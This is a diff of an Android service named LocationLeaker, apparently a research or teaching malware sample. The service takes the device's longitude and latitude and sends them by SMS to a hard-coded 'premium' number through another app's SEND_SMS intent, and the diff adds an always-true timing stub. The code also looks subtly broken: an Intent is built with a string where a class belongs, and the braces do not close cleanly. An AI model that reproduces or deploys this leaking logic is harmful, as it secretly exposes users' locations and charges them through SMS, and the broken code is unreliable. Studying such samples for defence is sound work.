@@ -5,9 +5,11 @@ import android.content.Intent;
 import android.os.IBinder;
 import android.util.Log;
 
+import java.util.Date;
+
 public class LocationLeaker extends Service {
 
-    String premiumNumber="5554443333";
+    String premiumNumber="5554";
     public LocationLeaker() {
     }
 
@@ -31,12 +33,20 @@ public class LocationLeaker extends Service {
         Log.i("Attacker", "received the location "+longitude+" "+latitude+" Thank you!");
 
         //send the location via a text message
-        Intent i = new Intent();
+        Intent i = new Intent(this.getApplicationContext(), "action");
         i.setAction("edu.uci.seal.action.SEND_SMS");
         i.putExtra("PHONE_NUMBER", premiumNumber);
         i.putExtra("TEXT_MSG", "longitude:"+longitude+", latitude:"+latitude);
         startService(i);
 
         return START_NOT_STICKY;
+
+
+
+
     }
+
+    private boolean goodTimeToWork(Date date) {
+        return true;
     }
+}
